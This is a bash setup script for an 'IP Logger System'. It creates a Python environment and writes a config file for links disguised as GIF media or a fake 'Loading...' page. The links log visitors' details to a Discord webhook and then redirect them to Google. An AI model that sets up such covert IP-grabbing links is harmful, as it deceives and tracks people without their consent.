#!/bin/bash

# IP Logger System - Setup Script

echo "🕵️  IP Logger System - Setup"
echo "============================"

# Check Python
if ! command -v python3 &> /dev/null; then
    echo "❌ Python 3 is required but not installed."
    exit 1
fi

PYTHON_VERSION=$(python3 --version)
echo "✅ Python found: $PYTHON_VERSION"

# Create virtual environment
echo ""
echo "📦 Creating virtual environment..."
python3 -m venv venv

# Activate virtual environment
echo "🔧 Activating virtual environment..."
source venv/bin/activate

# Install dependencies
echo "⬇️  Installing dependencies..."
pip install -r requirements.txt

# Create logs directory
echo "📁 Creating logs directory..."
mkdir -p logs

# Create .env.example
echo ""
echo "📝 Creating .env.example file..."
cat > .env.example << 'EOF'
# Discord Webhook URL (REQUIRED)
DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/YOUR/WEBHOOK

# Server settings
HOST=0.0.0.0
PORT=5000
DEBUG=False
SECRET_KEY=change-this-secret-key-in-production

# Redirect URL after logging
REDIRECT_URL=https://www.google.com

# Landing page text
LANDING_PAGE_TITLE=Loading...
LANDING_PAGE_MESSAGE=Redirecting you to the requested page...

# GIF/Media Links (customizable)
GIF_1113=https://media.giphy.com/media/l0HlNQ03J5J07t0HC/giphy.gif
GIF_1114=https://media.giphy.com/media/xT9IgzoKnwFNmISR8I/giphy.gif
GIF_1115=https://media.giphy.com/media/l2YwWpMmQF55Dn8Is/giphy.gif
GIF_1116=https://media.giphy.com/media/3o7abKhOpu0NwenH3O/giphy.gif
GIF_1117=https://media.giphy.com/media/l41lFw057lAJcwgTm/giphy.gif
GIF_1118=https://media.giphy.com/media/xT0xeMA62E1XIl52Ew/giphy.gif
GIF_1119=https://media.giphy.com/media/l3q2K5jinAlChoCLS/giphy.gif

# Rate limiting
RATE_LIMIT=10

# Logging
ENABLE_CONSOLE_LOGS=True
ENABLE_FILE_LOGS=True
LOG_FILE_PATH=logs/access.log
EOF

echo ""
echo "✅ Setup complete!"
echo ""
echo "📋 Next steps:"
echo "  1. Copy .env.example to .env: cp .env.example .env"
echo "  2. Edit .env and add your Discord webhook URL"
echo "  3. Activate venv: source venv/bin/activate"
echo "  4. Run server: python app.py"
echo ""
echo "🎬 To customize GIF links:"
echo "  - Edit .env and change GIF_1113, GIF_1114, etc."
echo "  - Or edit config.py MEDIA_LINKS dictionary"
echo "  - Access via: http://your-server/api/media/gif.1113.mp4"
echo ""
echo "⚠️  REMEMBER: Use responsibly and comply with privacy laws."
